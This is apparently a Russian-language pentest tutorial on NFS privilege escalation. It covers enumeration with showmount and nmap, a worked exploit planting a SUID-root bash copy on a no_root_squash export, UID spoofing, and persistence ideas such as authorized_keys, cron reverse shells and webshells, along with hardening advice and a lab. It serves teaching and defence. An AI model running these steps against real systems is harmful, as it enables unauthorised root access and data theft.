NFS (Network File System) — стандартный способ раздавать каталоги в Unix-сетях. Проблема в том, что NFS доверяет **UID/GID клиента**: сервер считает, что если клиент представился как UID 0 (root), то он и есть root. На этом строится один из самых простых способов повышения привилегий в Linux-инфраструктуре — смонтировать экспорт и записать туда что-нибудь от имени root.

## Протокол NFS и версии

NFS работает поверх RPC. Порт основного сервиса (2049 для NFSv3/v4) и вспомогательных сервисов (`rpcbind`/portmapper 111, `mountd`, `statd`, `lockd`) обычно динамический. Версии:

- **NFSv2/v3** — stateless, отдельный `mountd`, порты динамические, аутентификация по IP + AUTH_UNIX (UID/GID).
- **NFSv4** — только порт 2049, встроенный mount, поддержка ACL и Kerberos (RPCSEC_GSS).

Ключевой для атак момент — **AUTH_UNIX**: клиент шлёт свой UID/GID в запросе, и сервер их принимает без доказательств.

| Сервис | Порт | Назначение |
|---|---|---|
| rpcbind/portmapper | 111 (tcp/udp) | Регистрация RPC-программ |
| nfsd | 2049 | NFS |
| mountd | динамич. | Монтирование (v3) |
| statd/lockd | динамич. | Блокировки |

## Экспорты и права

Экспорты описаны в `/etc/exports`:

```
/srv/share   10.0.0.0/24(rw,sync,no_subtree_check)
/home        *(ro,root_squash)
/data        *(rw,no_root_squash,no_all_squash)
```

Опции, критичные для безопасности:

- **`rw`** — разрешена запись;
- **`no_root_squash`** — запросы от UID 0 **не** понижаются до `nobody` (root клиента = root сервера!);
- **`root_squash`** (по умолчанию) — UID 0 маппится в `nobody`;
- **`no_all_squash`** — не понижать остальные UID;
- **`insecure`** — разрешить подключение с непривилегированного порта;
- **`anonuid`/`anongid`** — под каким UID работать анонимно.

Именно `no_root_squash` в связке с `rw` и wildcard-экспортом (`*`) — классическая дыра.

## Инструменты перечисления

```bash
# RPC-сервисы на хосте
rpcinfo -p 10.0.0.5
# Экспорты NFS (v3)
showmount -e 10.0.0.5
# Скан NFS-скриптами nmap
sudo nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs 10.0.0.5
# Проверить доступ без монтирования (иногда)
showmount -a 10.0.0.5
```

Вывод `showmount -e` покажет список экспортов и разрешённые сети — это первый шаг.

## Разобранный пример: от экспорта к root

1. Скан и экспорты:
   ```bash
   showmount -e 10.0.0.5
   # Export list for 10.0.0.5:
   # /data  *
   ```
2. Монтируем (в своей системе — от root):
   ```bash
   sudo mkdir -p /mnt/nfs
   sudo mount -t nfs 10.0.0.5:/data /mnt/nfs -o nolock
   ```
3. Смотрим содержимое и владельцев:
   ```bash
   ls -la /mnt/nfs
   # drwx------ 2 root root ... home
   ```
4. Если в экспорте есть `/home/<user>`, можно, имея локального пользователя с нужным UID, читать чужие файлы (UID совпадает — доступ есть). Это утечка данных.
5. Если экспорт `no_root_squash` и `rw`, создаём SUID-root-бинарник прямо в шаре:
   ```bash
   cp /bin/bash /mnt/nfs/rootbash
   sudo chown root:root /mnt/nfs/rootbash
   sudo chmod 4755 /mnt/nfs/rootbash
   ```
   Затем на жертве (через другой вектор доступа) или локально запускаем:
   ```bash
   /mnt/nfs/rootbash -p
   # root-shell
   ```
6. Альтернативно — запись SSH-ключа в чужой `~/.ssh/authorized_keys` или в `/etc/cron.d/` (если экспорт покрывает эти пути).

## UID/GID spoofing

Даже без `no_root_squash` можно эксплуатировать совпадение UID: если у вас есть локальный root, вы можете `su` в пользователя с нужным UID (или создать его), чтобы читать/писать файлы в экспорте. На некоторых системах UID 0 через AUTH_UNIX проходит, если сервер настроен слабо. Проверка:

```bash
# Создаём пользователя с нужным UID, чтобы совпасть с владельцем файлов в экспорте
sudo useradd -u 1001 -M tmpuser
sudo -u tmpuser ls -la /mnt/nfs/home/someuser
```

## Атаки через запись в NFS

Если у вас есть write-доступ к системным путям экспорта:

- **`~/.ssh/authorized_keys`** — добавить свой публичный ключ → SSH-доступ;
- **`/etc/cron.d/`** или crontab пользователя — запланировать reverse shell;
- **`/etc/passwd`/`shadow`** — добавить root-пользователя с известным хэшем;
- **`.bashrc`/`.profile`** — выполнить код при следующем логине жертвы;
- **веб-рут** (`/var/www`) — положить webshell, если на сервере есть веб-сервис.

## Защита

| Мера | Против чего |
|---|---|
| `root_squash` (по умолчанию) | SUID-атака, root-запись |
| Экспорт только конкретным IP/подсетям | Неавторизованный доступ |
| `ro` там, где запись не нужна | Изменение данных |
| NFSv4 + Kerberos (sec=krb5p) | UID-спуфинг, прослушка |
| Файрвол на 111/2049 | Сканирование и монтирование |
| `all_squash` + `anonuid` для публичных шар | Общий доступ |
| Не экспортировать `/`, `/home`, `/etc` целиком | Широкий доступ |

## Частые ошибки и подводные камни

- **Монтировать `-o nolock` без нужды** — может скрыть проблемы блокировок; для read-only ок.
- **Забывать про NFSv4.** В v4 нет `showmount -e`; используйте `nfs-ls` или монтирование с `vers=4`.
- **Путать `root_squash` и `all_squash`.** Первый понижает только UID 0, второй — всех.
- **Игнорировать UID-совпадение.** Даже с `root_squash` можно читать чужие файлы, если UID совпал.
- **Считать NFS «только для чтения».** Проверяйте `rw` — запись часто открывает путь к RCE.
- **Забывать размонтировать** после теста — это меняет состояние системы (незаметно для отчёта).

## Что дальше / решение

NFS — часть класса «сетевые файловые сервисы», куда также входят SMB (`network-netbios-llmnr`) и FTP. Дальше смотрите `network-service-enum` для системного подхода. Для защиты: включите `root_squash`, ограничьте экспорты по IP, используйте NFSv4 с Kerberos и закройте RPC-порты файрволом. Для CTF потренируйтесь: поднимите nfs-kernel-server с `no_root_squash` в лабе и пройдите путь до root-shell.

## NFSv4, ACL и Kerberos

NFSv4 отличается от v3 принципиально: единый порт 2049, встроенный механизм монтирования (нет отдельного mountd), псевдо-файловая система и **обязательная поддержка ACL**. Для безопасности важнее другое — NFSv4 поддерживает **RPCSEC_GSS** с Kerberos, то есть режимы `sec=krb5` (аутентификация), `sec=krb5i` (целостность) и `sec=krb5p` (приватность/шифрование). При `sec=krb5p` трафик NFS шифруется, и UID-спуфинг становится невозможен: сервер доверяет не заявленному UID, а Kerberos-тикету.

Проверить, какой режим используется:

```bash
# Смонтировать с явным sec и посмотреть, что скажет сервер
sudo mount -t nfs4 -o sec=krb5p 10.0.0.5:/ /mnt/nfs4
mount | grep nfs
# Посмотреть экспорт и sec в /etc/exports на сервере (если доступ есть)
grep -E 'sec=|kerberos' /etc/exports
```

Если домен использует NFSv4 + Kerberos, классическая атака через `no_root_squash` не сработает — но неправильно настроенные `sec=sys`-экспорты (по умолчанию) остаются уязвимы. Всегда проверяйте, какой `sec` реально применяется.

## Лаборатория: полный цикл

1. На Ubuntu-сервере установите `nfs-kernel-server`, создайте `/srv/share` и экспорт с `no_root_squash`:
   ```
   /srv/share  *(rw,sync,no_root_squash,no_subtree_check)
   ```
2. С клиента: `showmount -e <ip>`, затем `mount -t nfs <ip>:/srv/share /mnt/nfs -o nolock`.
3. Создайте SUID-бинарь (`cp /bin/bash`, `chmod 4755`) — убедитесь, что он стал root:root (UID сохранился).
4. Запустите `/mnt/nfs/rootbash -p` — получите root-шелл на клиенте.
5. Исправьте экспорт на `root_squash`, перемонтируйте и повторите — SUID-бинарь станет `nobody`, атака не сработает.
6. Дополнительно попробуйте UID-спуфинг: создайте пользователя с UID, совпадающим с владельцем файлов в экспорте, и прочитайте их.

Так вы закрываете и атаку, и защиту, и получаете материал для отчёта.
